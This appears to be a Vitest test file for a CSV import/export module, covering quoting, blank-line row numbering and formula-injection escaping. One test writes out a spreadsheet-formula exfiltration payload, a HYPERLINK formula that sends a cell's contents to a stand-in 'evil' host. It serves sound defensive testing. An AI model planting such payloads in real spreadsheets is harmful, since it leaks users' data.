import { describe, expect, it } from 'vitest';
import { importItemsCsv, parseCsv, toCsv } from '../src/index.ts';
import { freshDb } from './helpers/db.ts';

describe('review: CSV import', () => {
  it('an inch mark inside an unquoted cell does not swallow the following rows', () => {
    const rows = parseCsv('Name,Alias\nGI elbow 1/2" x 3,1500\nTee,1600\n');
    expect(rows).toEqual([
      ['Name', 'Alias'],
      ['GI elbow 1/2" x 3', '1500'],
      ['Tee', '1600'],
    ]);
  });

  it('skipped-row numbers match the spreadsheet row even when blank lines are present', () => {
    const db = freshDb();
    // spreadsheet rows: 1 header, 2 blank, 3 good, 4 bad (negative price)
    const result = importItemsCsv(db, 'Name,Price\n\nGood item,10\nBad item,-5\n');
    expect(result.skipped.map((s) => s.row)).toEqual([4]);
  });

  it('CSV exports neutralise spreadsheet formulas in text cells', () => {
    const out = toCsv(
      ['Party'],
      [['=HYPERLINK("http://evil/?"&A1,"click")'], ['@SUM(A1)'], ['+1+1']],
    );
    for (const line of out.split('\n').slice(1, 4)) {
      expect(line.replace(/^"/, '')).not.toMatch(/^[=+@-]/);
    }
  });
});
